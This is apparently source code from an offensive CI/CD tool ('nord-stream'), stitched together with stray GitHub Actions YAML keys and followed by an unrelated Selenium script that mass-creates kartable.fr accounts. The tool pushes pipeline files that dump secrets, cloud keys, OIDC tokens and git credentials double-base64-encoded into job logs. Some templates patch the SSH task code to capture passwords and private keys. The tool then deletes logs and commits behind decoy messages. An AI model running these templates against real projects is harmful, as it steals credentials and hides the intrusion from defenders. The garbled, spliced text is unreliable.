            repoName = project.get("name")
            repoId = project.get("id")

            if repoPath != repoName:
                logger.raw(f'- {project["path_with_namespace"]} / {repoId} ({repoName})\n', level=logging.INFO)
            else:
                logger.raw(f'- {project["path_with_namespace"]} / {repoId}\n', level=logging.INFO)

    def listGitLabUsers(self):
        logger.info("Listing GitLab users")
        for user in self._cicd.listUsers():
            id = user.get("id")
            username = user.get("username")
            email = user.get("email")
            is_admin = user.get("is_admin")

            res = f"- {id} {username}"
            if email != None:
                res += f" {email}"

            if is_admin != None:
                res += f"(is_admin: {is_admin})"

            logger.raw(f"{res}\n", level=logging.INFO)

    def listGitLabGroups(self):
        logger.info("Listing GitLab groups")
        for project in self._cicd.groups:
            logger.raw(f'- {project["full_path"]}\n', level=logging.INFO)

    def runPipeline(self):
        for project in self._cicd.projects:

            repoPath = project.get("path")
            repoName = project.get("name")

            if repoPath != repoName:
                logger.success(f'"{repoName}" ({repoPath})')
            else:
                logger.success(f'"{repoName}"')

            if self._localPath == None:
                domain = urlparse(self._cicd.url).netloc
                if self._cicd.url.startswith("https"):
                    handler = "https"
                else:
                    handler = "http"

                url = f"{handler}://foo:{self._cicd.token}@{domain}/{project.get('path_with_namespace')}"
                Git.gitClone(url)

            else:
                repoPath = self._localPath

            chdir(repoPath)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                # TODO: branch protections
                # if not self._forceDeploy:
                #    self.__checkAndDisableBranchProtectionRules(repo)

                if self._yaml:
                    self.__runCustomPipeline(project)
                else:
                    logger.error("No yaml specify")

            except KeyboardInterrupt:
                pass

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:
                self.__clean(project)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoPath}", shell=True).wait()

        logger.info(f"Check output: {self._cicd.outputDir}")

    def __runCustomPipeline(self, project):
        logger.info(f"Running custom pipeline: {self._yaml}")

        pipelineGenerator = GitLabPipelineGenerator()
        pipelineGenerator.loadFile(self._yaml)

        try:
            pipelineId = self.__launchPipeline(project, pipelineGenerator)
            if pipelineId:
                self._fileName = self._cicd.downloadPipelineOutput(project, pipelineId)
                if self._fileName:
                    self.__extractPipelineOutput(project)
                    logger.empty_line()
        except Exception as e:
            logger.error(f"Error: {e}")

        finally:
            logger.empty_line()

    def __launchPipeline(self, project, pipelineGenerator):
        logger.verbose(f"Launching pipeline.")

        projectId = project.get("id")

        pipelineGenerator.writeFile(f".gitlab-ci.yml")
        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
                logger.error("Error when pushing code: Everything up-to-date")
                logger.warning(
                    "Your trying to push the same code on an existing branch, modify the yaml file to push it."
                )

            elif pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)

            else:
                self._pushedCommitsCount += 1
                logger.raw(pushOutput.communicate()[1])

                pipelineId, pipelineStatus = self._cicd.waitPipeline(projectId)

                if pipelineStatus == "success":
                    logger.success("Pipeline has successfully terminated.")
                    return pipelineId

                elif pipelineStatus == "failed":
                    self.__displayFailureReasons(projectId, pipelineId)

                return pipelineId

        except Exception as e:
            logger.exception(e)
        finally:
            pass

    def __extractPipelineOutput(self, project, resultsFilename="secrets.txt"):

        projectPath = project.get("path_with_namespace")

        with open(
            f"{self._cicd.outputDir}/{projectPath}/{self._fileName}",
            "rb",
        ) as output:

            pipelineResults = output.read()

        logger.success("Output:")
        logger.raw(pipelineResults, logging.INFO)

    def __clean(self, project):

        if self._pushedCommitsCount > 0:

            projectId = project.get("id")
            if self._cleanLogs:
                logger.info(f"Cleaning logs for project: {project.get('path_with_namespace')}")
                self._cicd.cleanAllLogs(projectId)

            logger.verbose("Cleaning commits.")
            if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
            else:
                if not self.__deleteRemoteBranch():
                    logger.info("Cleaning remote branch.")
                    # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                    Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for project in self._cicd.projects:
            logger.info(f"Cleaning logs for project: {project.get('path_with_namespace')}")
            self._cicd.cleanAllLogs(project.get("id"))

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        deleteOutput = Git.gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)
            return False
        return True

    def describeToken(self):
        response = self._cicd.getUser()
        logger.info("Token information:")

        username = response.get("username")
        if username != "":
            logger.raw(f"\t- Username: {username}\n", logging.INFO)

        isAdmin = response.get("is_admin")
        if isAdmin == None:
            logger.raw(f"\t- IsAdmin: False\n", logging.INFO)
        else:
            logger.raw(f"\t- IsAdmin: {isAdmin}\n", logging.INFO)

        email = response.get("email")
        if email != "":
            logger.raw(f"\t- Email: {email}\n", logging.INFO)

        id = response.get("id")
        if id != "":
            logger.raw(f"\t- Id: {id}\n", logging.INFO)

        note = response.get("note")
        if note != "" and note != None:
            logger.raw(f"\t- Note: {note}\n", logging.INFO)

    def listBranchesProtectionRules(self):
        logger.info("Listing branch protection rules.")
        for project in self._cicd.projects:

            projectName = project.get("path_with_namespace")
            logger.info(f"{projectName}:")

            try:
                protections = self._cicd.getBranchesProtectionRules(project.get("id"))
                self.__displayBranchesProtectionRulesPriv(protections)
            except GitLabError as e:
                logger.verbose(
                    "Not enough privileges to get full details on the branch protection rules for this project, trying to get limited information."
                )
                try:
                    branches = self._cicd.getBranches(project.get("id"))
                    self.__displayBranchesProtectionRulesUnpriv(branches)
                except GitLabError as e:
                    logger.error(f"\t{e}")

            logger.empty_line()

    def __displayBranchesProtectionRulesPriv(self, protections):
        if len(protections) == 0:
            logger.success(f"No protection")

        for protection in protections:

            name = protection.get("name")
            logger.info(f'branch: "{name}"')

            allow_force_push = protection.get("allow_force_push")
            logger.raw(f"\t- Allow force push: {allow_force_push}\n", logging.INFO)

            code_owner_approval_required = protection.get("code_owner_approval_required", None)
            if code_owner_approval_required != None:
                logger.raw(f"\t- Code Owner approval required: {code_owner_approval_required}\n", logging.INFO)

            push_access_levels = protection.get("push_access_levels", [])
            logger.raw(f"\t- Push access level:\n", logging.INFO)
            self.__displayAccessLevel(push_access_levels)

            unprotect_access_levels = protection.get("unprotect_access_levels", [])
            logger.raw(f"\t- Unprotect access level:\n", logging.INFO)
            self.__displayAccessLevel(unprotect_access_levels)

            merge_access_levels = protection.get("merge_access_levels", [])
            logger.raw(f"\t- Merge access level:\n", logging.INFO)
            self.__displayAccessLevel(merge_access_levels)

    def __displayBranchesProtectionRulesUnpriv(self, branches):

        for branch in branches:

            isProtected = branch.get("protected")
            if isProtected:

                name = branch.get("name")
                logger.info(f'branch: "{name}"')

                logger.raw(f"\t- Protected: True\n", logging.INFO)

                developers_can_push = branch.get("developers_can_push")
                logger.raw(f"\t- Developers can push: {developers_can_push}\n", logging.INFO)

                developers_can_merge = branch.get("developers_can_merge")
                logger.raw(f"\t- Developers can merge: {developers_can_merge}\n", logging.INFO)

    def __displayAccessLevel(self, access_levels):
        for al in access_levels:
            access_level = al.get("access_level", None)
            user_id = al.get("user_id", None)
            group_id = al.get("group_id", None)
            access_level_description = al.get("access_level_description")

            res = f"\t\t{access_level_description}"

            if access_level != None:
                res += f" (access_level={access_level})"
            if user_id != None:
                res += f" (user_id={user_id})"
            if group_id != None:
                res += f" (group_id={group_id})"

            logger.raw(f"{res}\n", logging.INFO)

    def __displayFailureReasons(self, projectId, pipelineId):
        logger.error("Pipeline has failed.")

        pipelineFailure = self._cicd.getFailureReasonPipeline(projectId, pipelineId)
        if pipelineFailure:
            logger.error(f"{pipelineFailure}")
        else:
            jobsFailure = self._cicd.getFailureReasonJobs(projectId, pipelineId)

            for failure in jobsFailure:

                name = failure["name"]
                stage = failure["stage"]
                reason = failure["failure_reason"]

                logger.raw(f"\t- {name}: {reason} (stage={stage})\n", logging.INFO) 

    runs-on: # All constants
OUTPUT_DIR = "nord-stream-logs"
DEFAULT_BRANCH_NAME = "dev_remote_ea5Eu/test/v1"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
)

# GIT constants
GIT_USER = "nord-stream"
GIT_EMAIL = "nord-stream@localhost.com"
GIT_ATTACK_COMMIT_MSG = "Test deployment"
GIT_CLEAN_COMMIT_MSG = "Remove test deployment"

# GITLAB constants
COMPLETED_STATES = ["success", "failed", "canceled", "skipped"]

# Azure DevOps
DEFAULT_PIPELINE_NAME = "Build_pipeline_58675"
DEFAULT_REPO_NAME = "TestDev_ea5Eu"
DEFAULT_TASK_NAME = "Task fWQf8"

# GitHub
DEFAULT_WORKFLOW_FILENAME = "init_ZkITM.yaml" 
    strategy: class DevOpsError(Exception):
    pass


class GitHubError(Exception):
    pass


class GitHubBadCredentials(Exception):
    pass


class GitLabError(Exception):
    pass


class GitError(Exception):
    pass


class GitPushError(GitError):
    pass


class RepoCreationError(Exception):
    pass 
      fail-fast: import random, string


def isHexadecimal(s):
    hex_digits = set("0123456789abcdefABCDEF")
    return all(c in hex_digits for c in s)


def isGitLabSessionCookie(s):
    return isHexadecimal(s) and len(s) == 32


def isAZDOBearerToken(s):
    return s.startswith("eyJ0") and len(s) > 52 and s.count(".") == 2


def randomString(length):
    letters = string.ascii_lowercase
    return "".join(random.choice(letters) for i in range(length))


def isAllowed(value, sclist, allow=True):
    if allow:
        return value in sclist
    else:
        return not value in sclist 
      matrix: """
custom logging module.
"""

import logging
import os
from typing import Any, cast

from rich.console import Console
from rich.logging import RichHandler

# Blablabla "roll your own logging handler"
# https://github.com/Textualize/rich/issues/2647#issuecomment-1335017733
class WhitespaceStrippingConsole(Console):
    def _render_buffer(self, *args, **kwargs):
        rendered = super()._render_buffer(*args, **kwargs)
        newline_char = "\n" if len(rendered) >= 1 and rendered[-1] == "\n" else ""
        return "\n".join(line.rstrip() for line in rendered.splitlines()) + newline_char


class NordStreamLog(logging.Logger):
    # New logging level
    SUCCESS: int = 25
    VERBOSE: int = 15

    @staticmethod
    def setVerbosity(verbose: int, quiet: bool = False):
        """Set logging level accordingly to the verbose count or with quiet enable."""
        if quiet:
            logger.setLevel(logging.CRITICAL)
        elif verbose == 1:
            logger.setLevel(NordStreamLog.VERBOSE)
        elif verbose >= 2:
            logger.setLevel(logging.DEBUG)
        else:
            # Default INFO
            logger.setLevel(logging.INFO)

    def debug(self, msg: Any, *args: Any, **kwargs: Any) -> None:
        """Change default debug text format with rich color support"""
        super(NordStreamLog, self).debug("{}[D]{} {}".format("[bold yellow3]", "[/bold yellow3]", msg), *args, **kwargs)

    def verbose(self, msg: Any, *args: Any, **kwargs: Any) -> None:
        """Add verbose logging method with text format / rich color support"""
        if self.isEnabledFor(NordStreamLog.VERBOSE):
            self._log(NordStreamLog.VERBOSE, "{}[V]{} {}".format("[bold blue]", "[/bold blue]", msg), args, **kwargs)

    def raw(
        self,
        msg: Any,
        level=VERBOSE,
        markup=False,
        highlight=False,
        emoji=False,
        rich_parsing=False,
    ) -> None:
        """Add raw text logging, used for stream printing."""
        if rich_parsing:
            markup = True
            highlight = True
            emoji = True
        if self.isEnabledFor(level):
            if type(msg) is bytes:
                msg = msg.decode("utf-8", errors="ignore")
            # Raw message are print directly to the console bypassing logging system and auto formatting
            console.print(msg, end="", markup=markup, highlight=highlight, emoji=emoji, soft_wrap=True)

    def info(self, msg: Any, *args: Any, **kwargs: Any) -> None:
        """Change default info text format with rich color support"""
        super(NordStreamLog, self).info("{}[*]{} {}".format("[bold blue]", "[/bold blue]", msg), *args, **kwargs)

    def warning(self, msg: Any, *args: Any, **kwargs: Any) -> None:
        """Change default warning text format with rich color support"""
        super(NordStreamLog, self).warning(
            "{}[!]{} {}".format("[bold orange3]", "[/bold orange3]", msg), *args, **kwargs
        )

    def error(self, msg: Any, *args: Any, **kwargs: Any) -> None:
        """Change default error text format with rich color support"""
        super(NordStreamLog, self).error("{}[-]{} {}".format("[bold red]", "[/bold red]", msg), *args, **kwargs)

    def exception(self, msg: Any, *args: Any, **kwargs: Any) -> None:
        """Change default exception text format with rich color support"""
        super(NordStreamLog, self).exception("{}[x]{} {}".format("[bold red]", "[/bold red]", msg), *args, **kwargs)

    def critical(self, msg: Any, *args: Any, **kwargs: Any) -> None:
        """Change default critical text format with rich color support
        Add auto exit."""
        super(NordStreamLog, self).critical("{}[!]{} {}".format("[bold red]", "[/bold red]", msg), *args, **kwargs)
        exit(1)

    def success(self, msg: Any, *args: Any, **kwargs: Any) -> None:
        """Add success logging method with text format / rich color support"""
        if self.isEnabledFor(NordStreamLog.SUCCESS):
            self._log(NordStreamLog.SUCCESS, "{}[+]{} {}".format("[bold green]", "[/bold green]", msg), args, **kwargs)

    def empty_line(self, log_level: int = logging.INFO) -> None:
        """Print an empty line."""
        self.raw(os.linesep, level=log_level)


# Global rich console object
console: Console = WhitespaceStrippingConsole()

# Main logging default config
# Set default Logger class as NordStreamLog
logging.setLoggerClass(NordStreamLog)

# Add new level to the logging config
logging.addLevelName(NordStreamLog.VERBOSE, "VERBOSE")
logging.addLevelName(NordStreamLog.SUCCESS, "SUCCESS")

# Logging setup using RichHandler and minimalist text format
logging.basicConfig(
    format="%(message)s",
    handlers=[
        RichHandler(
            rich_tracebacks=True,
            show_time=False,
            markup=True,
            show_level=False,
            show_path=False,
            console=console,
        )
    ],
)

# Global logger object
logger: NordStreamLog = cast(NordStreamLog, logging.getLogger("main"))
# Default log level
logger.setLevel(logging.INFO) 
        python-version: import logging
from nordstream.utils.log import logger
from nordstream.yaml.generator import YamlGeneratorBase


class CustomGenerator(YamlGeneratorBase):
    def loadFile(self, file):
        logger.verbose("Loading YAML file.")
        with open(file, "r") as templateFile:
            try:
                self._defaultTemplate = templateFile.read()

            except Exception as exception:
                logger.error("[+] Error while reading yaml file")
                logger.exception(exception)

    def writeFile(self, file):
        logger.verbose("Writing YAML file.")
        if logger.getEffectiveLevel() == logging.DEBUG:
            logger.debug("Current yaml file:")
            self.displayYaml()

        with open(file, "w") as outputFile:
            outputFile.write(self._defaultTemplate)

    def displayYaml(self):
        logger.raw(self._defaultTemplate, logging.INFO) 

    steps: from nordstream.yaml.generator import YamlGeneratorBase
from nordstream.utils.constants import DEFAULT_TASK_NAME


class DevOpsPipelineGenerator(YamlGeneratorBase):
    taskName = DEFAULT_TASK_NAME
    _defaultTemplate = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "Bash@3",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": "env -0 | awk -v RS='\\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0 ; echo ",
                },
                "env": "#FIXME",
            }
        ],
        "trigger": "none",
        "variables": [{"group": "#FIXME"}],
    }
    _secureFileTemplate = {
        "pool": {"vmImage": "ubuntu-latest"},
        "trigger": "none",
        "steps": [
            {
                "task": "DownloadSecureFile@1",
                "name": "secretFile",
                "inputs": {"secureFile": "#FIXME"},
            },
            {
                "script": "cat $(secretFile.secureFilePath) | base64 -w0 | base64 -w0; echo",
                "displayName": taskName,
            },
        ],
    }
    _serviceConnectionTemplateAzureRM = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "AzureCLI@2",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "addSpnToEnvironment": True,
                    "scriptType": "bash",
                    "scriptLocation": "inlineScript",
                    "azureSubscription": "#FIXME",
                    "inlineScript": (
                        'sh -c "env | grep \\"^servicePrincipal\\" | base64 -w0 |' ' base64 -w0; echo  ;"'
                    ),
                },
            }
        ],
        "trigger": "none",
    }
    _serviceConnectionTemplateGitHub = {
        "pool": {"vmImage": "ubuntu-latest"},
        "resources": {
            "repositories": [
                {
                    "repository": "devRepo",
                    "type": "github",
                    "endpoint": "None",
                    "name": "microsoft/azure-pipelines-tasks",
                }
            ]
        },
        "steps": [
            {"checkout": "devRepo", "persistCredentials": True},
            {
                "task": "Bash@3",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": 'sh -c "cat ./.git/config | base64 -w0 | base64 -w0; echo  ;"',
                },
            },
        ],
        "trigger": "none",
    }

    _serviceConnectionTemplateAWS = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "AWSShellScript@1",
                "displayName": taskName,
                "inputs": {
                    # "regionName": "#FIXME",
                    "awsCredentials": "#FIXME",
                    "scriptType": "inline",
                    "inlineScript": (
                        'sh -c "env | grep -E \\"(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)\\" | base64 -w0 |'
                        ' base64 -w0; echo  ;"'
                    ),
                },
            }
        ],
        "trigger": "none",
    }

    _serviceConnectionTemplateSonar = {
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {
                "task": "SonarQubePrepare@6",
                "inputs": {"SonarQube": "#FIXME", "scannerMode": "CLI", "projectKey": "sonarqube"},
            },
            {
                "task": "Bash@3",
                "displayName": taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": "sh -c 'env | grep SONARQUBE_SCANNER_PARAMS | base64 -w0 | base64 -w0; echo ;'",
                },
            },
        ],
        "trigger": "none",
    }

    _serviceConnectionTemplateSSH = {
        "trigger": "none",
        "pool": {"vmImage": "ubuntu-latest"},
        "steps": [
            {"checkout": "none"},
            {
                "script": 'SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js) ; cp $SSH_FILE $SSH_FILE.bak ; sed -i \'s|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout = getReadyTimeoutVariable();\\nconst fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz", data, (err) => {});|\' $SSH_FILE',
                "displayName": f"Preparing {taskName}",
            },
            {
                "task": "SSH@0",
                "continueOnError": True,
                "inputs": {"sshEndpoint": "#FIXME", "runOptions": "commands", "commands": "sleep 1"},
            },
            {
                "script": "SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js); mv $SSH_FILE.bak $SSH_FILE ; cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0 ; echo ''; rm /tmp/artefacts.tar.gz",
                "displayName": taskName,
            },
        ],
    }

    _serviceConnectionTemplateSSHWindows = {
        "trigger": "none",
        "pool": {"vmImage": "windows-latest"},
        "steps": [
            {"checkout": "none"},
            {
                "task": "PowerShell@2",
                "inputs": {
                    "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; copy $p $p+".bak"; (Get-Content -Path $p -Raw) -replace [regex]::Escape(\'const readyTimeout = getReadyTimeoutVariable();\'), \'const readyTimeout = getReadyTimeoutVariable();const fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("artefacts.tar.gz", data, (err) => {});\' | Set-Content -Path $p }',
                    "targetType": "inline",
                },
                "continueOnError": True,
            },
            {"task": "SSH@0", "inputs": {"sshEndpoint": "#FIXME", "runOptions": "commands", "commands": "sleep 1"}},
            {
                "task": "PowerShell@2",
                "inputs": {
                    "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; mv -force $p+".bak" $p ;}; $encodedOnce = [Convert]::ToBase64String([IO.File]::ReadAllBytes("artefacts.tar.gz"));$encodedTwice = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($encodedOnce));echo $encodedTwice; echo \'\'; rm artefacts.tar.gz;',
                    "targetType": "inline",
                },
                "displayName": taskName,
            },
        ],
    }

    def generatePipelineForSecretExtraction(self, variableGroup):
        self.addVariableGroupToYaml(variableGroup.get("name"))
        self.addSecretsToYaml(variableGroup.get("variables"))

    def generatePipelineForSecureFileExtraction(self, secureFile):
        self._defaultTemplate = self._secureFileTemplate
        self.__setSecureFile(secureFile)

    def generatePipelineForAzureRm(self, azureSubscription):
        self._defaultTemplate = self._serviceConnectionTemplateAzureRM
        self.__setAzureSubscription(azureSubscription)

    def generatePipelineForGitHub(self, endpoint):
        self._defaultTemplate = self._serviceConnectionTemplateGitHub
        self.__setGitHubEndpoint(endpoint)

    def generatePipelineForAWS(self, awsCredentials):
        self._defaultTemplate = self._serviceConnectionTemplateAWS
        # self.__setAWSRegion(regionName)
        self.__setAWSCredential(awsCredentials)

    def generatePipelineForSonar(self, sonarSCName):
        self._defaultTemplate = self._serviceConnectionTemplateSonar
        self.__setSonarServiceConnectionName(sonarSCName)

    def generatePipelineForSSH(self, sshSCName):
        self._defaultTemplate = self._serviceConnectionTemplateSSH
        self.__setSSHServiceConnectionName(sshSCName)

    def addVariableGroupToYaml(self, variableGroupName):
        self._defaultTemplate.get("variables")[0]["group"] = variableGroupName

    def addSecretsToYaml(self, secrets):
        self._defaultTemplate.get("steps")[0]["env"] = {}
        for sec in secrets:
            key = f"secret_{sec}"
            value = f"$({sec})"
            self._defaultTemplate.get("steps")[0].get("env")[key] = value

    def __setSecureFile(self, secureFile):
        self._defaultTemplate.get("steps")[0].get("inputs")["secureFile"] = secureFile

    def __setAzureSubscription(self, azureSubscription):
        self._defaultTemplate.get("steps")[0].get("inputs")["azureSubscription"] = azureSubscription

    def __setGitHubEndpoint(self, endpoint):
        self._defaultTemplate.get("resources").get("repositories")[0]["endpoint"] = endpoint

    def __setAWSRegion(self, regionName):
        self._defaultTemplate.get("steps")[0].get("inputs")["regionName"] = regionName

    def __setAWSCredential(self, awsCredentials):
        self._defaultTemplate.get("steps")[0].get("inputs")["awsCredentials"] = awsCredentials

    def __setSonarServiceConnectionName(self, scName):
        self._defaultTemplate.get("steps")[0].get("inputs")["SonarQube"] = scName

    def __setSSHServiceConnectionName(self, sshName):
        self._defaultTemplate.get("steps")[2].get("inputs")["sshEndpoint"] = sshName 
    - uses: import yaml
import logging
from nordstream.utils.log import logger


class YamlGeneratorBase:
    _defaultTemplate = ""

    @property
    def defaultTemplate(self):
        return self._defaultTemplate

    @defaultTemplate.setter
    def defaultTemplate(self, value):
        logger.warning("Using your own yaml template might break stuff.")
        self._defaultTemplate = value

    @staticmethod
    def getEnvironnmentFromYaml(yamlFile):
        with open(yamlFile, "r") as file:
            try:
                data = yaml.safe_load(file)
                return data.get("jobs").get("init").get("environment", None)

            except yaml.YAMLError as exception:
                logger.exception("Yaml error")
                logger.exception(exception)

    def loadFile(self, file):
        logger.verbose("Loading YAML file.")
        with open(file, "r") as templateFile:
            try:
                self._defaultTemplate = yaml.load(templateFile, Loader=yaml.BaseLoader)

            except yaml.YAMLError as exception:
                logger.error("[+] Yaml error")
                logger.exception(exception)

    def writeFile(self, file):
        logger.verbose("Writing YAML file.")
        if logger.getEffectiveLevel() == logging.DEBUG:
            logger.debug("Current yaml file:")
            self.displayYaml()

        with open(file, "w") as outputFile:
            yaml.dump(self._defaultTemplate, outputFile, sort_keys=False)

    def displayYaml(self):
        logger.raw(yaml.dump(self._defaultTemplate, sort_keys=False), logging.INFO) 
    - name: from nordstream.utils.log import logger
from nordstream.yaml.generator import YamlGeneratorBase


class WorkflowGenerator(YamlGeneratorBase):
    _defaultTemplate = {
        "name": "GitHub Actions",
        "on": "push",
        "jobs": {
            "init": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {
                        "run": "env -0 | awk -v RS='\\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0",
                        "name": "command",
                        "env": None,
                    }
                ],
            }
        },
    }

    _OIDCAzureTokenTemplate = {
        "name": "GitHub Actions",
        "on": "push",
        "permissions": {"id-token": "write", "contents": "read"},
        "jobs": {
            "init": {
                "runs-on": "ubuntu-latest",
                "environment": None,
                "steps": [
                    {
                        "name": "login",
                        "uses": "azure/login@v1",
                        "with": {"client-id": None, "tenant-id": None, "allow-no-subscriptions": True},
                    },
                    {
                        "name": "command",
                        "run": '(echo "Access token to use with Azure Resource Manager API:"; az account get-access-token; echo -e "\nAccess token to use with MS Graph API:"; az account get-access-token --resource-type ms-graph) | base64 -w0 | base64 -w0',
                    },
                ],
            }
        },
    }

    _OIDCAWSTokenTemplate = {
        "name": "GitHub Actions",
        "on": "push",
        "permissions": {"id-token": "write", "contents": "read"},
        "jobs": {
            "init": {
                "runs-on": "ubuntu-latest",
                "environment": None,
                "steps": [
                    {
                        "name": "login",
                        "uses": "aws-actions/configure-aws-credentials@v1-node16",
                        "with": {"role-to-assume": None, "role-session-name": "oidcrolesession", "aws-region": None},
                    },
                    {
                        "name": "command",
                        "run": "sh -c 'env | grep \"^AWS_\" | base64 -w0 | base64 -w0'",
                    },
                ],
            }
        },
    }

    def generateWorkflowForSecretsExtraction(self, secrets, env=None):
        self.addSecretsToYaml(secrets)
        if env is not None:
            self.addEnvToYaml(env)

    def generateWorkflowForOIDCAzureTokenGeneration(self, tenant, subscription, client, env=None):
        self._defaultTemplate = self._OIDCAzureTokenTemplate
        self.addAzureInfoForOIDCToYaml(tenant, subscription, client)

        if env is not None:
            self.addEnvToYaml(env)

    def generateWorkflowForOIDCAWSTokenGeneration(self, role, region, env=None):
        self._defaultTemplate = self._OIDCAWSTokenTemplate
        self.addAWSInfoForOIDCToYaml(role, region)

        if env is not None:
            self.addEnvToYaml(env)

    def addEnvToYaml(self, env):
        try:
            self._defaultTemplate.get("jobs").get("init")["environment"] = env
        except TypeError as e:
            logger.exception(e)

    def getEnv(self):
        try:
            return self._defaultTemplate.get("jobs").get("init").get("environment", None)
        except TypeError as e:
            logger.exception(e)

    def addSecretsToYaml(self, secrets):
        self._defaultTemplate.get("jobs").get("init").get("steps")[0]["env"] = {}
        for sec in secrets:
            key = f"secret_{sec}"
            value = f"${{{{secrets.{sec}}}}}"
            self._defaultTemplate.get("jobs").get("init").get("steps")[0].get("env")[key] = value

    def addAzureInfoForOIDCToYaml(self, tenant, subscription, client):
        self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["tenant-id"] = tenant
        self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["client-id"] = client

        if subscription:
            self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["subscription-id"] = subscription

    def addAWSInfoForOIDCToYaml(self, role, region):
        self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["role-to-assume"] = role
        self._defaultTemplate["jobs"]["init"]["steps"][0]["with"]["aws-region"] = region 
      uses: from nordstream.yaml.generator import YamlGeneratorBase


class GitLabPipelineGenerator(YamlGeneratorBase):
    _defaultTemplate = {} 
      with: """
Reuires a webbrowser and the helium module
The hashlib module isn't needed basically as I had to find an easy way to get different a password for each account
BUT, kartable.fr accepts pretty much every fuckin' email, name, password and birthdate without complaining
so you could create an account with a non-existing email

Most of the features are unstable and I'll certainly add a log file to handle errors
"""
import helium
import hashlib
import time
from selenium.webdriver.support.ui import Select

class main:
    def __init__(self, classe, firstname, lastname, email, password, birthdate=None, ecole="victor hugo", url="https://www.kartable.fr/inscription"):
        # birthdate as follows : DD/MM/YYYY
        self.url = url
        self.classe = classe
        self.firstname = firstname
        self.lastname = lastname
        self.email = email
        self.password = password
        self.ecole = ecole
        self.birthdate = birthdate.split("/") if len(str(birthdate).split("/")) == 3 else None
        self.driver = helium.start_chrome(self.url)

    def register(self, sponso=False):
        if sponso == False:
            try:
                helium.click("élève")
                helium.click("élève")
            except LookupError:
                print("élève failed")
        helium.click(self.classe)
        helium.click("s'inscrire avec un e-mail")
        helium.write(self.firstname, into="prénom")
        helium.write(self.lastname, into="nom")
        helium.write(self.email, into="adresse e-mail")
        helium.write(self.password, into="mot de passe")
        # Setting custom birthdate
        self.set_birthdate()
        helium.click("terminer")
        # time.sleep(5)
        try:
            helium.click("plus tard")
        except LookupError:
            pass
        time.sleep(5)

    def log_out(self):
        #!!!!!NOT TESTED YET!!!!!!
        self.driver.get("https://www.kartable.fr/compte")
        helium.click("Se déconnecter")
        helium.click("SE DÉCONNECTER")

    def log_in(self):
        self.driver.get("https://www.kartable.fr/connexion")
        helium.write(self.email, into="adresse e-mail")
        helium.write(self.password, into="mot de passe")
        helium.click("se connecter")

    def join_school(self):
        #!!!!!NOT TESTED YET!!!!!!
        self.driver.get(
            "https://www.kartable.fr/classe?navigationOrigin=ruby-quest")
        helium.write(self.ecole, into="Rechercher un établissement...")
        select = Select(self.driver.find_element_by_tag_name('select'))
        select.select_by_value('1')  # select the first
        helium.click("rejoindre")
        self.driver.find_element_by_class_name("icon-close").click()

    def delete_school(self):
        return "Not implemented yet"

    def change_email(self, new_email):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles/modifier-adresse-email
        for i in self.driver.find_element_by_tag_name("input"):
            helium.write(new_email, into=i)
        helium.click("mettre à jour")

    def change_password(self, new_password):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles/modifier-mot-de-passe
        helium.write(self.password, into="Mot de passe actuel")
        helium.write(new_password, into="Nouveau mot de passe")
        helium.write(new_password, into="Ressaisir nouveau mot de passe")
        helium.click("mettre à jour")

    def is_locked(self, ressource):
        return "Not implemented yet"
        # self.driver.find_element_by_class_name("document__state")#if child has class icon-document-locked :True

    @property
    def current_email(self):
        #!!!!!NOT TESTED YET!!!!!!
